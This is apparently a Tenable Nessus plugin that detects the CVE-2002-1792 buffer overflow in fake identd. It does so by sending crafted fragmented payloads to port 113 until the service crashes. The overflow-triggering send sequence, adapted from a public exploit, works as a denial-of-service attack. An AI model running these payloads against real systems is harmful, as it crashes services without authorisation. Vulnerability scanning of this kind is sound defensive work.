#
# (C) Tenable Network Security, Inc.
#

# This script largely based on lameident3-exp.c by
# sloth@nopninjas.com - http://www.nopninjas.com
#
# This problem was originally found by Jedi/Sector One (j@pureftpd.org)
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and additional information reference link
#

include("compat.inc");

if (description)
{
 script_id(11054);
 script_version("$Revision: 1.21 $");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");

 script_cve_id("CVE-2002-1792");
 script_bugtraq_id(5351);
 script_osvdb_id(37815);

 script_name(english:"fake identd (fakeidentd) Fragmented Packet Request Remote Overflow");
 script_summary(english:"crashes the remote identd");

 script_set_attribute(attribute:"synopsis", value:"The identd server is prone to a remote buffer overflow attack.");
 script_set_attribute(attribute:"description", value:
"The identd server on this port seems to be a version of fake identd
that fails to properly validate user input before copying it into a
buffer of fixed size. By splitting data into two or more packets, an
anonymous remote attacker can overflow the input buffer and execute
arbitrary code with root privileges.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jul/370");
 script_set_attribute(attribute:"solution", value:
"Either disable the service if it's not required or upgrade to Fake
Identd version 1.5 as that reportedly is not affected by this
vulnerability.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2002/07/29");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/07/30");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 script_dependencie("find_service1.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/auth", 113);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_service(svc:"auth", default: 113);

soc = open_sock_tcp(port);
if(soc)
{
 send(socket:soc, data:string(crap(32), "\r\n"));
 r = recv(socket:soc, length:4096);
 close(soc);
 if(!r)exit(0, "No answer from TCP port "+port+".");
}
else exit(1, "Can't open socket on TCP port "+port+".");


soc = open_sock_tcp(port);
if(soc)
{

 #
 # Due to the nature of the bug, we can't just send crap and hope
 # the remote service will crash....
 #
 #
 send(socket:soc, data:crap(19));
 deux = raw_string(0x41, 0xEB, 0xEF, 0xFA, 0xB7);
 send(socket:soc, data:deux);
 data = crap(data:raw_string(0xFF), length:19);
 for(i=0;i<6000;i=i+1)
 {
  send(socket:soc, data:data);
 }

 close(soc);


 soc2 = open_sock_tcp(port);
 if ( ! soc2 ) exit(1, "Cannot reconnect to TCP port "+port+".");
 send(socket:soc2, data:crap(19));
 deux = raw_string(0x41, 0x5B, 0xFF, 0xFF, 0xFF);
 send(socket:soc2, data:deux);
 trois = raw_string(0xFF, 0xFF, 0xFF, 0xFF);
 send(socket:soc2, data:trois);

 close(soc2);

 soc2 = open_sock_tcp(port);
 if ( ! soc2 ) exit(1, "Cannot reconnect to TCP port "+port+".");
 send(socket:soc2, data:string("1234, 1234\n"));
 r = recv(socket:soc2, length:4096);
 close(soc2);

 soc3 = open_sock_tcp(port);
 if(!soc3)security_hole(port);
}
